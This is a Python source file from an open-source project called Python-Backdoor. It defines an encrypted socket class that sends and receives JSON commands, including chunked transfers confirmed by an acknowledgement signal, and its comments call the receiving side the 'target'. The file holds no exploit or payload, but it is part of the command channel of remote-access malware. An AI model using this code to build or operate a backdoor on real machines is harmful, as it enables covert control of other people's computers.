"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""
import json
import logging

from src.definitions.commands import OK_SENDALL
from src.logger import LOGGER_ID

BUFFER = 1024


class EncryptedSocket:
    def __init__(self, socket, fernet):
        self.encryptor = fernet
        self.socket = socket
        self.logger = logging.getLogger(LOGGER_ID)

    def close(self):
        self.socket.close()

    def recvall(self, buffer, encrypted=True):
        if encrypted and self.encryptor is None:
            raise Exception("Key is not set")

        self.send_json(OK_SENDALL, encrypted=encrypted)

        data = b""
        while len(data) < buffer:
            data += self.socket.recv(BUFFER)

        if encrypted:
            data = self.encryptor.decrypt(data)

        self.logger.debug(f"recvall: {data}")

        return data

    def send(self, data, encrypted=True):
        if not encrypted:
            self.socket.send(data)
        else:
            if self.encryptor is None:
                raise Exception("Key is not set")
            else:
                self.socket.send(self.encryptor.encrypt(data))

    def recv(self, encrypted=True):
        if not encrypted:
            return self.socket.recv(BUFFER)
        else:
            if self.encryptor is None:
                raise Exception("Key is not set")

            return self.encryptor.decrypt(self.socket.recv(BUFFER))

    def recv_json(self, encrypted=True):
        data = self.recv(encrypted).decode()

        self.logger.debug(f"recv: {data}")

        return json.loads(data)

    def send_json(self, key, value=None, encrypted=True):
        command = json.dumps({"key": key, "value": value})

        self.logger.debug(f"send: {command}")

        command = command.encode()

        if encrypted:
            self.send(command)
        else:
            self.send(command, False)

    def sendall_json(self, key, data, sub_value=None, encrypted=True, is_bytes=False):
        if not is_bytes:
            data = data.encode()

        if encrypted:
            data = self.encryptor.encrypt(data)

        self.send_json(key, {"buffer": len(data), "value": sub_value}, encrypted)

        # check to make sure that target received signal to continue with transfer
        if self.recv_json(encrypted)["key"] != OK_SENDALL:
            self.logger.error(f"recvall: failed to get OK signal")
            return

        self.send(data, False)
